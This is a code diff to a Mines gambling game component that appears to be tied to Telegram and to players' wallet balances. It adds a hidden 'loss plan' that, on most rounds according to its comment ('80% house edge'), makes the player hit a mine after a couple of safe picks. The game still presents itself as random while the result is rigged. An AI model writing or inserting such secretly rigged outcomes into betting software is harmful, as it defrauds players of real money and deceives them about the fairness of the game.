@@ -7,6 +7,7 @@ import { useBalanceContext } from "@/contexts/BalanceContext";
 import { reportGameResult } from "@/lib/telegram";
 import GameCurrencyChips from "@/components/GameCurrencyChips";
 import { GameCurrencyMode, modeToWallet, toNativeAmount, currencySymbol } from "@/lib/gameCurrency";
+import { createLossPlan, shouldForceLoss, NO_LOSS_PLAN } from "@/lib/houseEdge";
 
 const GRID_SIZE = 5;
 const TOTAL_CELLS = GRID_SIZE * GRID_SIZE;
@@ -93,6 +94,7 @@ const MinesGame = () => {
   const remainingMinesRef = useRef(0);
   const revealedSafeRef = useRef<Set<number>>(new Set());
   const revealingRef = useRef(false);
+  const lossPlanRef = useRef(NO_LOSS_PLAN);
 
   const startGame = useCallback(async () => {
     if (currentBalance < selectedBet) return;
@@ -123,6 +125,7 @@ const MinesGame = () => {
     setSafePicks(0);
     setCurrentMultiplier(1);
     setWinAmount(0);
+    lossPlanRef.current = createLossPlan(2);
     setPhase("playing");
   }, [currentBalance, selectedBet, activeWallet, mineCount, currencyMode, refreshBalance]);
 
@@ -153,6 +156,10 @@ const MinesGame = () => {
     // Guarantee safe if no mines left
     if (remainingMines <= 0) hitProb = 0;
     
+    // 80% house edge: forced loss after a couple of safe picks
+    const plan = lossPlanRef.current;
+    if (plan.loss && safePicks >= plan.crashAfter && remainingMines > 0) hitProb = 1;
+
     const isMine = Math.random() < hitProb;
 
     if (isMine && remainingMines > 0) {
